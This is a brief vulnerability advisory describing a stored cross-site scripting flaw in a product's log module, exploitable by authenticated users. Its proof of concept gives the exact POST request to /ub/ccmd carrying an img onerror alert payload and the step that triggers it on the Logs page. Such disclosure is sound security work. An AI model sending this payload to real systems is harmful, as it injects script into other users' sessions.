Introduction
=================
A Stored cross-site scripting vulnerability allows remote authenticated users to inject arbitrary web scripts or HTML in the logs page via the log module. To exploit the vulnerability, the attacker must append an XSS payload to the log message.


Write-Up
=================
See [Docs Syslifters](https://docs.syslifters.com/) for a detailed write-up on how to exploit vulnerability.


Proof of Concept
=================
1) Store log entry with XSS payload:

	PATH: /ub/ccmd
	METHOD: POST
	BODY:
	[
		[
			"log",
			"error",
			"<img src=# onerror=\"alert('XSS')\">"
		]
	]

2) Trigger XSS payload by opening the Logs page and showing the respective log entry.
